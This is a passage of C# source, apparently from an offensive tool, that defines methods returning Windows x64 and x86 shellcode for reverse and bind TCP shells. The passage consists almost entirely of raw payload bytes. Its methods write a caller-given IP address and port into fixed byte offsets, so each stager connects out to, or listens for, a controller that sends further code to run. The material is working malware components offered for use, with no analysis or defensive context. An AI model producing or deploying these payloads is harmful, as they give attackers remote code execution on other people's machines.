					65,
					139,
					52,
					136,
					72,
					1,
					214,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					56,
					224,
					117,
					241,
					76,
					3,
					76,
					36,
					8,
					69,
					57,
					209,
					117,
					216,
					88,
					68,
					139,
					64,
					36,
					73,
					1,
					208,
					102,
					65,
					139,
					12,
					72,
					68,
					139,
					64,
					28,
					73,
					1,
					208,
					65,
					139,
					4,
					136,
					72,
					1,
					208,
					65,
					88,
					65,
					88,
					94,
					89,
					90,
					65,
					88,
					65,
					89,
					65,
					90,
					72,
					131,
					236,
					32,
					65,
					82,
					255,
					224,
					88,
					65,
					89,
					90,
					72,
					139,
					18,
					233,
					75,
					255,
					255,
					255,
					93,
					73,
					190,
					119,
					115,
					50,
					95,
					51,
					50,
					0,
					0,
					65,
					86,
					73,
					137,
					230,
					72,
					129,
					236,
					160,
					1,
					0,
					0,
					73,
					137,
					229,
					73,
					188,
					2,
					0,
					17,
					92,
					192,
					168,
					228,
					147,
					65,
					84,
					73,
					137,
					228,
					76,
					137,
					241,
					65,
					186,
					76,
					119,
					38,
					7,
					255,
					213,
					76,
					137,
					234,
					104,
					1,
					1,
					0,
					0,
					89,
					65,
					186,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					10,
					65,
					94,
					80,
					80,
					77,
					49,
					201,
					77,
					49,
					192,
					72,
					255,
					192,
					72,
					137,
					194,
					72,
					255,
					192,
					72,
					137,
					193,
					65,
					186,
					234,
					15,
					223,
					224,
					255,
					213,
					72,
					137,
					199,
					106,
					16,
					65,
					88,
					76,
					137,
					226,
					72,
					137,
					249,
					65,
					186,
					153,
					165,
					116,
					97,
					255,
					213,
					133,
					192,
					116,
					12,
					73,
					255,
					206,
					117,
					229,
					104,
					240,
					181,
					162,
					86,
					255,
					213,
					72,
					131,
					236,
					16,
					72,
					137,
					226,
					77,
					49,
					201,
					106,
					4,
					65,
					88,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					131,
					196,
					32,
					94,
					137,
					246,
					129,
					246,
					173,
					180,
					163,
					108,
					76,
					141,
					158,
					0,
					1,
					0,
					0,
					106,
					64,
					65,
					89,
					104,
					0,
					16,
					0,
					0,
					65,
					88,
					72,
					137,
					242,
					72,
					49,
					201,
					65,
					186,
					88,
					164,
					83,
					229,
					255,
					213,
					72,
					141,
					152,
					0,
					1,
					0,
					0,
					73,
					137,
					223,
					83,
					86,
					80,
					77,
					49,
					201,
					73,
					137,
					240,
					72,
					137,
					218,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					131,
					196,
					32,
					72,
					1,
					195,
					72,
					41,
					198,
					117,
					224,
					73,
					137,
					254,
					95,
					89,
					65,
					89,
					65,
					86,
					232,
					16,
					0,
					0,
					0,
					51,
					100,
					133,
					87,
					222,
					4,
					8,
					4,
					143,
					58,
					128,
					212,
					171,
					153,
					85,
					248,
					94,
					72,
					49,
					192,
					73,
					137,
					248,
					170,
					254,
					192,
					117,
					251,
					72,
					49,
					219,
					65,
					2,
					28,
					0,
					72,
					137,
					194,
					128,
					226,
					15,
					2,
					28,
					22,
					65,
					138,
					20,
					0,
					65,
					134,
					20,
					24,
					65,
					136,
					20,
					0,
					254,
					192,
					117,
					227,
					72,
					49,
					219,
					254,
					192,
					65,
					2,
					28,
					0,
					65,
					138,
					20,
					0,
					65,
					134,
					20,
					24,
					65,
					136,
					20,
					0,
					65,
					2,
					20,
					24,
					65,
					138,
					20,
					16,
					65,
					48,
					17,
					73,
					255,
					193,
					72,
					255,
					201,
					117,
					219,
					95,
					65,
					255,
					231
				};
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				array[246] = Convert.ToByte(array2[0]);
				array[247] = Convert.ToByte(array2[1]);
				array[248] = Convert.ToByte(array2[2]);
				array[249] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[244] = Convert.ToByte(num2);
						array[245] = Convert.ToByte(num4);
					}
					else
					{
						array[244] = b;
						array[245] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] BindTcp(string Port)
			{
				byte[] array = new byte[]
				{
					252,
					72,
					129,
					228,
					240,
					255,
					255,
					255,
					232,
					204,
					0,
					0,
					0,
					65,
					81,
					65,
					80,
					82,
					81,
					86,
					72,
					49,
					210,
					101,
					72,
					139,
					82,
					96,
					72,
					139,
					82,
					24,
					72,
					139,
					82,
					32,
					72,
					139,
					114,
					80,
					72,
					15,
					183,
					74,
					74,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					226,
					237,
					82,
					65,
					81,
					72,
					139,
					82,
					32,
					139,
					66,
					60,
					72,
					1,
					208,
					102,
					129,
					120,
					24,
					11,
					2,
					15,
					133,
					114,
					0,
					0,
					0,
					139,
					128,
					136,
					0,
					0,
					0,
					72,
					133,
					192,
					116,
					103,
					72,
					1,
					208,
					80,
					139,
					72,
					24,
					68,
					139,
					64,
					32,
					73,
					1,
					208,
					227,
					86,
					72,
					255,
					201,
					65,
					139,
					52,
					136,
					72,
					1,
					214,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					56,
					224,
					117,
					241,
					76,
					3,
					76,
					36,
					8,
					69,
					57,
					209,
					117,
					216,
					88,
					68,
					139,
					64,
					36,
					73,
					1,
					208,
					102,
					65,
					139,
					12,
					72,
					68,
					139,
					64,
					28,
					73,
					1,
					208,
					65,
					139,
					4,
					136,
					72,
					1,
					208,
					65,
					88,
					65,
					88,
					94,
					89,
					90,
					65,
					88,
					65,
					89,
					65,
					90,
					72,
					131,
					236,
					32,
					65,
					82,
					255,
					224,
					88,
					65,
					89,
					90,
					72,
					139,
					18,
					233,
					75,
					255,
					255,
					255,
					93,
					73,
					190,
					119,
					115,
					50,
					95,
					51,
					50,
					0,
					0,
					65,
					86,
					73,
					137,
					230,
					72,
					129,
					236,
					160,
					1,
					0,
					0,
					73,
					137,
					229,
					72,
					49,
					192,
					80,
					80,
					73,
					199,
					196,
					2,
					0,
					17,
					92,
					65,
					84,
					73,
					137,
					228,
					76,
					137,
					241,
					65,
					186,
					76,
					119,
					38,
					7,
					255,
					213,
					76,
					137,
					234,
					104,
					1,
					1,
					0,
					0,
					89,
					65,
					186,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					2,
					89,
					80,
					80,
					77,
					49,
					201,
					77,
					49,
					192,
					72,
					255,
					192,
					72,
					137,
					194,
					65,
					186,
					234,
					15,
					223,
					224,
					255,
					213,
					72,
					137,
					199,
					106,
					16,
					65,
					88,
					76,
					137,
					226,
					72,
					137,
					249,
					65,
					186,
					194,
					219,
					55,
					103,
					255,
					213,
					72,
					49,
					210,
					72,
					137,
					249,
					65,
					186,
					183,
					233,
					56,
					255,
					255,
					213,
					77,
					49,
					192,
					72,
					49,
					210,
					72,
					137,
					249,
					65,
					186,
					116,
					236,
					59,
					225,
					255,
					213,
					72,
					137,
					249,
					72,
					137,
					199,
					65,
					186,
					117,
					110,
					77,
					97,
					255,
					213,
					72,
					129,
					196,
					176,
					2,
					0,
					0,
					72,
					131,
					236,
					16,
					72,
					137,
					226,
					77,
					49,
					201,
					106,
					4,
					65,
					88,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					131,
					196,
					32,
					94,
					137,
					246,
					106,
					64,
					65,
					89,
					104,
					0,
					16,
					0,
					0,
					65,
					88,
					72,
					137,
					242,
					72,
					49,
					201,
					65,
					186,
					88,
					164,
					83,
					229,
					255,
					213,
					72,
					137,
					195,
					73,
					137,
					199,
					77,
					49,
					201,
					73,
					137,
					240,
					72,
					137,
					218,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					1,
					195,
					72,
					41,
					198,
					72,
					133,
					246,
					117,
					225,
					65,
					255,
					231
				};
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[253] = Convert.ToByte(num2);
						array[254] = Convert.ToByte(num4);
					}
					else
					{
						array[253] = b;
						array[254] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] ShellReverseTcp(string Ip, string Port)
			{
				byte[] array = new byte[]
				{
					252,
					72,
					131,
					228,
					240,
					232,
					204,
					0,
					0,
					0,
					65,
					81,
					65,
					80,
					82,
					81,
					86,
					72,
					49,
					210,
					101,
					72,
					139,
					82,
					96,
					72,
					139,
					82,
					24,
					72,
					139,
					82,
					32,
					72,
					139,
					114,
					80,
					72,
					15,
					183,
					74,
					74,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					226,
					237,
					82,
					65,
					81,
					72,
					139,
					82,
					32,
					139,
					66,
					60,
					72,
					1,
					208,
					102,
					129,
					120,
					24,
					11,
					2,
					15,
					133,
					114,
					0,
					0,
					0,
					139,
					128,
					136,
					0,
					0,
					0,
					72,
					133,
					192,
					116,
					103,
					72,
					1,
					208,
					80,
					139,
					72,
					24,
					68,
					139,
					64,
					32,
					73,
					1,
					208,
					227,
					86,
					72,
					255,
					201,
					65,
					139,
					52,
					136,
					72,
					1,
					214,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					56,
					224,
					117,
					241,
					76,
					3,
					76,
					36,
					8,
					69,
					57,
					209,
					117,
					216,
					88,
					68,
					139,
					64,
					36,
					73,
					1,
					208,
					102,
					65,
					139,
					12,
					72,
					68,
					139,
					64,
					28,
					73,
					1,
					208,
					65,
					139,
					4,
					136,
					72,
					1,
					208,
					65,
					88,
					65,
					88,
					94,
					89,
					90,
					65,
					88,
					65,
					89,
					65,
					90,
					72,
					131,
					236,
					32,
					65,
					82,
					255,
					224,
					88,
					65,
					89,
					90,
					72,
					139,
					18,
					233,
					75,
					255,
					255,
					255,
					93,
					73,
					190,
					119,
					115,
					50,
					95,
					51,
					50,
					0,
					0,
					65,
					86,
					73,
					137,
					230,
					72,
					129,
					236,
					160,
					1,
					0,
					0,
					73,
					137,
					229,
					73,
					188,
					2,
					0,
					17,
					92,
					192,
					168,
					228,
					147,
					65,
					84,
					73,
					137,
					228,
					76,
					137,
					241,
					65,
					186,
					76,
					119,
					38,
					7,
					255,
					213,
					76,
					137,
					234,
					104,
					1,
					1,
					0,
					0,
					89,
					65,
					186,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					10,
					65,
					94,
					80,
					80,
					77,
					49,
					201,
					77,
					49,
					192,
					72,
					255,
					192,
					72,
					137,
					194,
					72,
					255,
					192,
					72,
					137,
					193,
					65,
					186,
					234,
					15,
					223,
					224,
					255,
					213,
					72,
					137,
					199,
					106,
					16,
					65,
					88,
					76,
					137,
					226,
					72,
					137,
					249,
					65,
					186,
					153,
					165,
					116,
					97,
					255,
					213,
					133,
					192,
					116,
					12,
					73,
					255,
					206,
					117,
					229,
					104,
					240,
					181,
					162,
					86,
					255,
					213,
					72,
					131,
					236,
					16,
					72,
					137,
					226,
					77,
					49,
					201,
					106,
					4,
					65,
					88,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					131,
					196,
					32,
					94,
					137,
					246,
					106,
					64,
					65,
					89,
					104,
					0,
					16,
					0,
					0,
					65,
					88,
					72,
					137,
					242,
					72,
					49,
					201,
					65,
					186,
					88,
					164,
					83,
					229,
					255,
					213,
					72,
					137,
					195,
					73,
					137,
					199,
					77,
					49,
					201,
					73,
					137,
					240,
					72,
					137,
					218,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					1,
					195,
					72,
					41,
					198,
					72,
					133,
					246,
					117,
					225,
					65,
					255,
					231
				};
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				array[246] = Convert.ToByte(array2[0]);
				array[247] = Convert.ToByte(array2[1]);
				array[248] = Convert.ToByte(array2[2]);
				array[249] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[244] = Convert.ToByte(num2);
						array[245] = Convert.ToByte(num4);
					}
					else
					{
						array[244] = b;
						array[245] = Convert.ToByte(num);
					}
				}
				return array;
			}
			public byte[] ShellBindTcp(string Port)
			{
				byte[] array = new byte[]
				{
					252,
					72,
					129,
					228,
					240,
					255,
					255,
					255,
					232,
					204,
					0,
					0,
					0,
					65,
					81,
					65,
					80,
					82,
					81,
					86,
					72,
					49,
					210,
					101,
					72,
					139,
					82,
					96,
					72,
					139,
					82,
					24,
					72,
					139,
					82,
					32,
					72,
					139,
					114,
					80,
					72,
					15,
					183,
					74,
					74,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					60,
					97,
					124,
					2,
					44,
					32,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					226,
					237,
					82,
					65,
					81,
					72,
					139,
					82,
					32,
					139,
					66,
					60,
					72,
					1,
					208,
					102,
					129,
					120,
					24,
					11,
					2,
					15,
					133,
					114,
					0,
					0,
					0,
					139,
					128,
					136,
					0,
					0,
					0,
					72,
					133,
					192,
					116,
					103,
					72,
					1,
					208,
					80,
					139,
					72,
					24,
					68,
					139,
					64,
					32,
					73,
					1,
					208,
					227,
					86,
					72,
					255,
					201,
					65,
					139,
					52,
					136,
					72,
					1,
					214,
					77,
					49,
					201,
					72,
					49,
					192,
					172,
					65,
					193,
					201,
					13,
					65,
					1,
					193,
					56,
					224,
					117,
					241,
					76,
					3,
					76,
					36,
					8,
					69,
					57,
					209,
					117,
					216,
					88,
					68,
					139,
					64,
					36,
					73,
					1,
					208,
					102,
					65,
					139,
					12,
					72,
					68,
					139,
					64,
					28,
					73,
					1,
					208,
					65,
					139,
					4,
					136,
					72,
					1,
					208,
					65,
					88,
					65,
					88,
					94,
					89,
					90,
					65,
					88,
					65,
					89,
					65,
					90,
					72,
					131,
					236,
					32,
					65,
					82,
					255,
					224,
					88,
					65,
					89,
					90,
					72,
					139,
					18,
					233,
					75,
					255,
					255,
					255,
					93,
					73,
					190,
					119,
					115,
					50,
					95,
					51,
					50,
					0,
					0,
					65,
					86,
					73,
					137,
					230,
					72,
					129,
					236,
					160,
					1,
					0,
					0,
					73,
					137,
					229,
					72,
					49,
					192,
					80,
					80,
					73,
					199,
					196,
					2,
					0,
					17,
					92,
					65,
					84,
					73,
					137,
					228,
					76,
					137,
					241,
					65,
					186,
					76,
					119,
					38,
					7,
					255,
					213,
					76,
					137,
					234,
					104,
					1,
					1,
					0,
					0,
					89,
					65,
					186,
					41,
					128,
					107,
					0,
					255,
					213,
					106,
					2,
					89,
					80,
					80,
					77,
					49,
					201,
					77,
					49,
					192,
					72,
					255,
					192,
					72,
					137,
					194,
					65,
					186,
					234,
					15,
					223,
					224,
					255,
					213,
					72,
					137,
					199,
					106,
					16,
					65,
					88,
					76,
					137,
					226,
					72,
					137,
					249,
					65,
					186,
					194,
					219,
					55,
					103,
					255,
					213,
					72,
					49,
					210,
					72,
					137,
					249,
					65,
					186,
					183,
					233,
					56,
					255,
					255,
					213,
					77,
					49,
					192,
					72,
					49,
					210,
					72,
					137,
					249,
					65,
					186,
					116,
					236,
					59,
					225,
					255,
					213,
					72,
					137,
					249,
					72,
					137,
					199,
					65,
					186,
					117,
					110,
					77,
					97,
					255,
					213,
					72,
					129,
					196,
					176,
					2,
					0,
					0,
					72,
					131,
					236,
					16,
					72,
					137,
					226,
					77,
					49,
					201,
					106,
					4,
					65,
					88,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					131,
					196,
					32,
					94,
					137,
					246,
					106,
					64,
					65,
					89,
					104,
					0,
					16,
					0,
					0,
					65,
					88,
					72,
					137,
					242,
					72,
					49,
					201,
					65,
					186,
					88,
					164,
					83,
					229,
					255,
					213,
					72,
					137,
					195,
					73,
					137,
					199,
					77,
					49,
					201,
					73,
					137,
					240,
					72,
					137,
					218,
					72,
					137,
					249,
					65,
					186,
					2,
					217,
					200,
					95,
					255,
					213,
					72,
					1,
					195,
					72,
					41,
					198,
					72,
					133,
					246,
					117,
					225,
					65,
					255,
					231
				};
				int num = int.Parse(Port);
				byte b = 0;
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[253] = Convert.ToByte(num2);
						array[254] = Convert.ToByte(num4);
					}
					else
					{
						array[253] = b;
						array[254] = Convert.ToByte(num);
					}
				}
				return array;
			}
		}
		public class x86ShellString
		{
			public string ReverseTcp(string Ip, string Port)
			{
				string text = "0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xe4,0x93,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3";
				string[] array = text.Split(new char[]
				{
					','
				});
				string empty = string.Empty;
				string[] array2 = Ip.Split(new char[]
				{
					'.'
				});
				int value = int.Parse(array2[0]);
				int value2 = int.Parse(array2[1]);
				int value3 = int.Parse(array2[2]);
				int value4 = int.Parse(array2[3]);
				array[176] = "0x" + Convert.ToString(value, 16);
				array[177] = "0x" + Convert.ToString(value2, 16);
				array[178] = "0x" + Convert.ToString(value3, 16);
				array[179] = "0x" + Convert.ToString(value4, 16);
				int num = int.Parse(Port);
				bool flag = num > 256;
				if (flag)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = "0x" + Convert.ToString(num2, 16);
						array[184] = "0x" + Convert.ToString(num4, 16);
					}
					else
					{
						array[183] = "0x00";
						array[184] = "0x" + Convert.ToString(num, 16);
					}
				}
				return string.Join(",", array);
			}
		}
	}
}
